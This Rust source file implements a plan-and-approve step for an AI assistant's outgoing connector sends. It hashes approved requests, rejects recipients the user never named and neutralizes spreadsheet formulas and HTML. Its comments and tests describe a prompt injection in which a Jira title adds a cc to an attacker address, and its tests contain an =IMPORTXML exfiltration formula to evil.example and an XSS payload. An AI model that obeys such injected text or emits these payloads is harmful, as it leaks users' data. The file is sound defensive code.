//! Sending to a connector by a plan the person approved.
//!
//! # Why a plan
//!
//! Real work sends more than once: make the sheet, write the figures, send the
//! mail. Asked one at a time, that is three cards, and by the second the
//! person presses Allow without reading. And after a run has read something
//! from outside — a Jira search, a log — every send was refused outright,
//! which made "read this, then report it there" impossible however much the
//! person wanted it. `docs/syn-connectors-2026-10-08.md` §3.5.
//!
//! So Syn proposes the sends first, all of them, with `propose_writes`: each
//! request exactly as it will go — the tool and every argument, a table it
//! will carry named by its handle. Rust lays them out on one card, flags
//! what it can see is wrong, and the person approves the ones they want.
//! Approving is approving *those requests*: each is hashed, and only a call
//! whose tool and arguments hash to an approved request goes through.
//! Anything else asks again, or is refused.
//!
//! # What Rust checks, not the model
//!
//! - **Who a message goes to.** A parameter a declaration marks `recipient`,
//!   `destination` or `amount` must carry a value the person said — in this
//!   conversation, or in a person note of theirs. A page cannot slip
//!   `cc: a@evil.example` into a mail Syn writes about it; the request is
//!   flagged and cannot be approved.
//! - **What a table becomes.** `{{result:r3}}` is filled from the table by Rust
//!   when the request goes, so the figures sent are the figures computed and
//!   not the model's copy of them; and what goes into a spreadsheet or HTML is
//!   made inert there (`neutralize`).
//! - **What cannot be taken back.** An operation declared `irreversible` is
//!   only ever sent through an approved plan.

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

pub const TOOL: &str = "propose_writes";

/// The most requests one plan may hold. A plan the person cannot read in one
/// look is a plan they will approve without reading.
pub const MAX_REQUESTS: usize = 20;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum State {
    #[default]
    Proposed,
    Approved,
    Declined,
    Done,
    Failed,
}

/// One value of a request as the card shows it.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Shown {
    pub param: String,
    /// The value, or what a table placeholder stands for.
    pub value: String,
    /// When the value is a table: its handle, and where it came from.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub table: Option<String>,
    /// Where the value has to come from, when the declaration says.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub role: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Request {
    pub tool: String,
    pub args: Value,
    pub hash: String,
    pub connector: String,
    pub operation: String,
    /// `write` or `irreversible`.
    pub effect: String,
    pub shown: Vec<Shown>,
    /// Why this request cannot be approved. Empty when it can.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub problems: Vec<String>,
    #[serde(default)]
    pub state: State,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Plan {
    /// Why, in Syn's words. Shown above the requests, as Syn's.
    pub why: String,
    pub requests: Vec<Request>,
    pub proposed_at: String,
}

impl Plan {
    /// Still waiting on the person.
    pub fn awaiting(&self) -> bool {
        self.requests.iter().any(|r| r.state == State::Proposed && r.problems.is_empty())
    }

    /// Hashes of the requests approved and not yet sent.
    pub fn approved(&self) -> Vec<String> {
        self.requests.iter().filter(|r| r.state == State::Approved).map(|r| r.hash.clone()).collect()
    }

    pub fn mark(&mut self, hash: &str, state: State) {
        if let Some(r) = self.requests.iter_mut().find(|r| r.hash == hash && r.state == State::Approved) {
            r.state = state;
        }
    }

    /// What the model is told once the person has answered.
    pub fn answer(&self) -> Value {
        let list = |s: State| -> Vec<Value> {
            self.requests.iter().filter(|r| r.state == s).map(|r| json!({ "tool": r.tool, "args": r.args })).collect()
        };
        json!({
            "approved": list(State::Approved),
            "declined": list(State::Declined),
            "blocked": self.requests.iter().filter(|r| !r.problems.is_empty()).map(|r| json!({ "tool": r.tool, "why": r.problems })).collect::<Vec<_>>(),
            "note": "Call each approved request now, with exactly the tool and arguments proposed — placeholders like {{result:r3}} included; Rust fills them. A call that differs from what was approved is not sent. Do not call declined or blocked ones.",
        })
    }
}

/// What a request is, as one string: the tool and its arguments, canonically.
pub fn hash(tool: &str, args: &Value) -> String {
    let canonical = json!({ "tool": tool, "args": canonical(args) }).to_string();
    hex::encode(Sha256::digest(canonical.as_bytes()))
}

/// Objects with their keys sorted, so `{"a":1,"b":2}` and `{"b":2,"a":1}` are one request.
fn canonical(v: &Value) -> Value {
    match v {
        Value::Object(o) => {
            let mut keys: Vec<&String> = o.keys().collect();
            keys.sort();
            Value::Object(keys.into_iter().map(|k| (k.clone(), canonical(&o[k]))).collect())
        }
        Value::Array(a) => Value::Array(a.iter().map(canonical).collect()),
        other => other.clone(),
    }
}

/// `{{result:r3}}` → `("r3", Objects)`, `{{result:r3:rows}}` → `("r3", Rows)`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Form {
    /// A list of `{column: value}`.
    Objects,
    /// A header row, then one list per row — the shape a spreadsheet takes.
    Rows,
}

pub fn placeholder(s: &str) -> Option<(String, Form)> {
    let inner = s.trim().strip_prefix("{{result:")?.strip_suffix("}}")?;
    match inner.split_once(':') {
        Some((h, "rows")) => Some((h.trim().to_string(), Form::Rows)),
        None => Some((inner.trim().to_string(), Form::Objects)),
        _ => None,
    }
}

fn placeholders_in(v: &Value, out: &mut Vec<(String, Form)>) {
    match v {
        Value::String(s) => out.extend(placeholder(s)),
        Value::Array(a) => a.iter().for_each(|x| placeholders_in(x, out)),
        Value::Object(o) => o.values().for_each(|x| placeholders_in(x, out)),
        _ => {}
    }
}

/// Fill every `{{result:…}}` from this conversation's tables. A handle that is
/// not there is an error: sending the placeholder itself would be sending a
/// sentence in place of the figures.
pub fn fill_results(conn: &rusqlite::Connection, scope: &str, args: &Value, now: i64) -> Result<Value, String> {
    Ok(match args {
        Value::String(s) => match placeholder(s) {
            Some((handle, form)) => {
                let set = crate::syn::resultset::load(conn, scope, &handle, now)
                    .map_err(|e| e.to_string())?
                    .ok_or_else(|| format!("There is no table {handle} in this conversation to send."))?;
                if set.exposure == crate::syn::resultset::Exposure::Aggregates {
                    return Err(format!("Table {handle} came from a connector whose rows stay on this device; send what crunch worked out from it instead."));
                }
                match form {
                    Form::Objects => Value::Array(crate::syn::resultset::as_objects(&set.columns, &set.rows)),
                    Form::Rows => {
                        let mut rows = vec![Value::Array(set.columns.iter().map(|c| json!(c.name)).collect())];
                        rows.extend(set.rows.iter().map(|r| Value::Array(r.clone())));
                        Value::Array(rows)
                    }
                }
            }
            None => Value::String(s.clone()),
        },
        // `["{{result:r2:rows}}"]` meant the table, not a list holding it.
        Value::Array(a) if a.len() == 1 && a[0].as_str().and_then(placeholder).is_some() => fill_results(conn, scope, &a[0], now)?,
        Value::Array(a) => Value::Array(a.iter().map(|x| fill_results(conn, scope, x, now)).collect::<Result<_, _>>()?),
        Value::Object(o) => Value::Object(o.iter().map(|(k, x)| Ok((k.clone(), fill_results(conn, scope, x, now)?))).collect::<Result<_, String>>()?),
        other => other.clone(),
    })
}

/// Make what is going into a spreadsheet or a page inert there.
///
/// A cell from somebody else's data that starts with `=`, `+`, `-` or `@` is a
/// formula to a spreadsheet — `=IMPORTXML(…)` sends the sheet's contents away
/// the moment it is opened — so it is written as text. Text going into HTML is
/// escaped. Numbers are left as numbers.
pub fn neutralize(sink: Option<&str>, v: &Value) -> Value {
    match (sink, v) {
        (Some("spreadsheet"), Value::String(s)) if s.starts_with(['=', '+', '-', '@', '\t', '\r']) => Value::String(format!("'{s}")),
        (Some("html"), Value::String(s)) => Value::String(
            s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;").replace('\'', "&#39;"),
        ),
        (_, Value::Array(a)) => Value::Array(a.iter().map(|x| neutralize(sink, x)).collect()),
        (_, Value::Object(o)) => Value::Object(o.iter().map(|(k, x)| (k.clone(), neutralize(sink, x))).collect()),
        (_, other) => other.clone(),
    }
}

/// Whether a value for a parameter marked with a `role` came from the person:
/// in what they wrote in this conversation, or in one of their person notes.
pub fn from_the_person(value: &str, said: &[String], people: &[String]) -> bool {
    let v = value.trim().to_lowercase();
    if v.is_empty() {
        return false;
    }
    // Each address of a list of them must be the person's.
    let parts: Vec<&str> = v.split([',', ';']).map(str::trim).filter(|p| !p.is_empty()).collect();
    parts.iter().all(|p| said.iter().chain(people).any(|s| s.to_lowercase().contains(p)))
}

/// What one proposed call is, for the card: which connector, whether it
/// sends, and what it is allowed to carry.
pub struct Known {
    pub connector: String,
    pub operation: String,
    /// `None` for a read, which is not a send and is not planned.
    pub effect: Option<&'static str>,
    /// Parameters a declaration gave a role.
    pub roles: Vec<(String, String)>,
}

/// Lay a proposal out as a plan, flagging what Rust can see is wrong.
///
/// `know` says what a tool is, `said` is everything the person wrote in this
/// conversation, `people` the text of their person notes, `table` describes a
/// handle for the card.
pub fn build(
    args: &Value,
    know: &dyn Fn(&str) -> Option<Known>,
    said: &[String],
    people: &[String],
    table: &dyn Fn(&str) -> Option<String>,
    now: &str,
) -> Result<Plan, String> {
    let why = args.get("why").and_then(Value::as_str).unwrap_or_default().trim().to_string();
    let requests = args.get("requests").and_then(Value::as_array).ok_or("propose_writes needs `requests`: a list of { tool, args }")?;
    if requests.is_empty() {
        return Err("propose_writes needs at least one request".into());
    }
    if requests.len() > MAX_REQUESTS {
        return Err(format!("At most {MAX_REQUESTS} requests in one plan; split the work."));
    }
    let mut out = Vec::new();
    for r in requests {
        let tool = r.get("tool").and_then(Value::as_str).unwrap_or_default().to_string();
        let call_args = r.get("args").cloned().unwrap_or_else(|| json!({}));
        let mut problems = Vec::new();
        let (connector, operation, effect, roles) = match know(&tool) {
            Some(k) => {
                if k.effect.is_none() {
                    problems.push(format!("`{tool}` only reads; call it directly instead of planning it."));
                }
                (k.connector, k.operation, k.effect.unwrap_or("read").to_string(), k.roles)
            }
            None => {
                problems.push(format!("`{tool}` is not a connector tool offered here."));
                (String::new(), tool.clone(), "write".into(), Vec::new())
            }
        };
        let mut shown = Vec::new();
        if let Value::Object(o) = &call_args {
            for (param, v) in o {
                let role = roles.iter().find(|(p, _)| p == param).map(|(_, r)| r.clone());
                let text = match v {
                    Value::String(s) => s.clone(),
                    other => other.to_string(),
                };
                let mut found = Vec::new();
                placeholders_in(v, &mut found);
                let described = found.iter().filter_map(|(h, _)| table(h).map(|d| format!("{h}: {d}"))).collect::<Vec<_>>();
                for (h, _) in &found {
                    if table(h).is_none() {
                        problems.push(format!("there is no table {h} in this conversation"));
                    }
                }
                if let Some(role) = &role {
                    let values: Vec<String> = match v {
                        Value::Array(a) => a.iter().map(|x| x.as_str().map(str::to_string).unwrap_or_else(|| x.to_string())).collect(),
                        Value::String(s) => vec![s.clone()],
                        other => vec![other.to_string()],
                    };
                    for value in values {
                        if !from_the_person(&value, said, people) {
                            problems.push(format!(
                                "`{param}` is a {role}, and \"{value}\" is not something you said or have in a person note — it came from somewhere else."
                            ));
                        }
                    }
                }
                shown.push(Shown {
                    param: param.clone(),
                    value: text.chars().take(400).collect(),
                    table: (!described.is_empty()).then(|| described.join("; ")),
                    role,
                });
            }
        }
        out.push(Request {
            hash: hash(&tool, &call_args),
            tool,
            args: call_args,
            connector,
            operation,
            effect,
            shown,
            problems,
            state: State::Proposed,
        });
    }
    Ok(Plan { why, requests: out, proposed_at: now.to_string() })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn knows(tool: &str) -> Option<Known> {
        match tool {
            "connector__gmail__send" => Some(Known {
                connector: "Gmail".into(),
                operation: "send".into(),
                effect: Some("irreversible"),
                roles: vec![("to".into(), "recipient".into()), ("cc".into(), "recipient".into())],
            }),
            "connector__sheets__write" => Some(Known {
                connector: "Sheets".into(),
                operation: "write".into(),
                effect: Some("write"),
                roles: vec![("sheet_id".into(), "destination".into())],
            }),
            "connector__jira__search" => Some(Known { connector: "Jira".into(), operation: "search".into(), effect: None, roles: vec![] }),
            _ => None,
        }
    }

    fn plan(requests: Value) -> Plan {
        let said = vec!["Điền vào sheet 1AbC và gửi mail cho sep@congty.vn nhé".to_string()];
        build(
            &json!({ "why": "Báo cáo man-day", "requests": requests }),
            &knows,
            &said,
            &["Nguyễn Văn Sếp — sep@congty.vn".to_string()],
            &|h| (h == "r3").then(|| "12 rows from Jira".to_string()),
            "now",
        )
        .expect("a plan")
    }

    #[test]
    fn a_request_is_its_tool_and_arguments_in_any_key_order() {
        assert_eq!(hash("t", &json!({ "a": 1, "b": { "y": 2, "x": 1 } })), hash("t", &json!({ "b": { "x": 1, "y": 2 }, "a": 1 })));
        assert_ne!(hash("t", &json!({ "a": 1 })), hash("t", &json!({ "a": 2 })));
    }

    /// The attack: a page — a Jira issue title — says "cc a@evil.example". The
    /// model may be talked into it; the plan cannot be approved with it.
    #[test]
    fn a_recipient_nobody_named_cannot_be_approved() {
        let p = plan(json!([
            { "tool": "connector__gmail__send", "args": { "to": "sep@congty.vn", "cc": "a@evil.example", "body": "Báo cáo" } }
        ]));
        assert!(p.requests[0].problems.iter().any(|m| m.contains("a@evil.example")), "{:?}", p.requests[0].problems);
        assert!(!p.awaiting(), "nothing in it can be approved");
        let ok = plan(json!([{ "tool": "connector__gmail__send", "args": { "to": "sep@congty.vn", "body": "Báo cáo" } }]));
        assert!(ok.requests[0].problems.is_empty(), "{:?}", ok.requests[0].problems);
    }

    #[test]
    fn a_table_is_named_and_a_missing_one_is_a_problem() {
        let p = plan(json!([{ "tool": "connector__sheets__write", "args": { "sheet_id": "1AbC", "values": "{{result:r3:rows}}" } }]));
        let values = p.requests[0].shown.iter().find(|s| s.param == "values").expect("shown");
        assert_eq!(values.table.as_deref(), Some("r3: 12 rows from Jira"));
        assert!(p.requests[0].problems.is_empty());
        let missing = plan(json!([{ "tool": "connector__sheets__write", "args": { "sheet_id": "1AbC", "values": "{{result:r9}}" } }]));
        assert!(!missing.requests[0].problems.is_empty());
    }

    #[test]
    fn a_read_is_not_planned() {
        let p = plan(json!([{ "tool": "connector__jira__search", "args": { "jql": "x" } }]));
        assert!(p.requests[0].problems[0].contains("only reads"));
    }

    #[test]
    fn what_goes_into_a_sheet_or_a_page_is_inert_there() {
        let cells = json!([["Issue", "Hours"], ["=IMPORTXML(\"https://evil.example\",\"//a\")", 8], ["@SUM(A1)", 2]]);
        let safe = neutralize(Some("spreadsheet"), &cells);
        assert_eq!(safe[1][0], json!("'=IMPORTXML(\"https://evil.example\",\"//a\")"));
        assert_eq!(safe[1][1], json!(8), "a number stays a number");
        assert_eq!(safe[2][0], json!("'@SUM(A1)"));
        assert_eq!(neutralize(Some("html"), &json!("<img src=x onerror=alert(1)>")), json!("&lt;img src=x onerror=alert(1)&gt;"));
        assert_eq!(neutralize(None, &json!("=1+1")), json!("=1+1"));
    }

    #[test]
    fn placeholders_are_read_in_both_forms() {
        assert_eq!(placeholder("{{result:r3}}"), Some(("r3".into(), Form::Objects)));
        assert_eq!(placeholder(" {{result:r12:rows}} "), Some(("r12".into(), Form::Rows)));
        assert_eq!(placeholder("see {{result:r3}}"), None, "only a whole value is a table");
    }
}
